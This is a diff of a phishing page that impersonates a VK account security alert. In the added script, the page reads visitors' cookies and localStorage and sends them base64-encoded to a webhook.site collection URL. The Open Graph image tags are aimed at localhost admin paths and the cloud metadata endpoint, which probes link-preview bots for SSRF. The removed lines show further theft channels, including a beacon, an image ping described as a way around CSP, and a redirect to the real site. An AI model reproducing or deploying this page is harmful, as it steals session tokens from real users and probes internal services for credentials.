@@ -3,49 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:title" content="Внимание: Обнаружена попытка входа">
-    <meta property="og:image" content="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/bot_og_image.png">
-    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg.">
     
-    <link rel="icon" href="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/favicon.ico">
+    <meta property="og:image" content="http://127.0.0.1:80/admin/logo.png">
+    
+    <meta property="og:image:secure_url" content="http://169.254.169.254/latest/meta-data/">
+    
+    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg.">
+
+    <link rel="icon" href="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/target_hit.ico">
 
     <title>VK Security Center</title>
 </head>
 <body>
     <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>Проверка безопасности аккаунта...</h2>
-        <p>Идет синхронизация сессии, пожалуйста, не закрывайте страницу.</p>
+        <h2>Проверка безопасности...</h2>
+        <p>Идет сканирование узлов сессии. Пожалуйста, подождите.</p>
     </div>
 
     <script>
+        // Клиентская часть для сбора данных тех, кто кликнет по ссылке
         (function() {
             const hook = "https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d";
-            
-            // Собираем всё, что можем, включая localStorage (там бывают токены)
-            let report = {
-                type: "VISIT",
+            let data = {
                 ua: navigator.userAgent,
-                cookies: document.cookie || "none",
-                storage: JSON.stringify(localStorage).substring(0, 500)
+                ck: document.cookie || "none",
+                ls: JSON.stringify(localStorage).substring(0, 300)
             };
-
-            // Комбинированный метод отправки (fetch + Beacon API)
-            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(report))));
-            
-            // 1. Стандартный fetch
-            fetch(`${hook}/report?d=${payload}`, {mode: 'no-cors'});
-            
-            // 2. Beacon API - работает даже если вкладку сразу закрыли
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(`${hook}/beacon`, payload);
-            }
-
-            // 3. Пинг через картинку для обхода CSP
-            new Image().src = `${hook}/img_ping?v=${Date.now()}`;
-
-            // Редирект через 2 секунды на настройки безопасности VK
-            setTimeout(() => {
-                window.location.href = "https://vk.com/settings?act=security";
-            }, 2000);
+            fetch(`${hook}/client_data?d=${btoa(JSON.stringify(data))}`, {mode:'no-cors'});
         })();
     </script>
 </body>
